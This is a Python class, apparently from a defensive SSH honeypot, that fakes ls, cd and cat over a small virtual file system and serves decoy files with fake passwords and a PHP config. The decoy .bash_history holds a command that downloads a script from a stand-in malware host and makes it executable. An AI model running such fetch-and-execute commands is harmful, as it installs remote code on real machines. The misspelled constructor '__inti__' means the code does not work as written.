class FileCommands:
    """Handles file-related commands"""

    def __inti__(self, session):
        self.session = session
        # Simple VFS for now
        self.vfs = {
            "/root": ["Documents", "Downloads", "passwords.txt", ".bash_history"],
            "/etc": ["password", "shadow", "hosts", "ssh"],
            "/var/www": ["html", "config.php"],
        }

    def handle(self, cmd, args):
        """Route file commands"""
        if cmd == "ls":
            return self._ls(args)
        elif cmd == "pwd":
            return self.session.current_dir
        elif cmd == "cd":
            return self._cd(args)
        elif cmd == "cat":
            return self._cat(args)
        return ""
    
    def _ls(self, args):
        """Fake ls output"""
        path = self.session.current_dir
        if path in self.vfs:
            return "  ".join(self.vfs[path])
        return "ls: cannot access: No such file or directory"
    
    def _cd(self, args):
        """Fake cd - just track the path"""
        if not args:
            self.session.current_dir = "/root"
            return ""
        
        new_path = args[0]
        if new_path in self.vfs:
            self.session.current_dir = new_path
            return ""
        return f"-bash: cd: {new_path}: No such file or directory"
    
    def _cat(self, args): 
        """Fake cat - show honeyfile content"""
        if not args:
            return "cat: missing operand"
        
        filename = args[0]

        # Honeyfiles with enticing content
        honeyfiles = {
            "passwords.txt": "admin:P@ssw0rd123\nroot:SuperSecret99\ndbuser:mysql_2024",
            ".bash_history": "mysql -u root -p\nwget http://malware.example.com/bot.sh\nchmod +x bot.sh",
            "config.php": "<?php\n$db_host = '127.0.0.1';\n$db_user = 'admin';\n$db_pass = 'dbP@ss2024';\n?>"
        }

        if filename in honeyfiles:
            return honeyfiles[filename]
        
        return f"cat: {filename}: No such file or directory"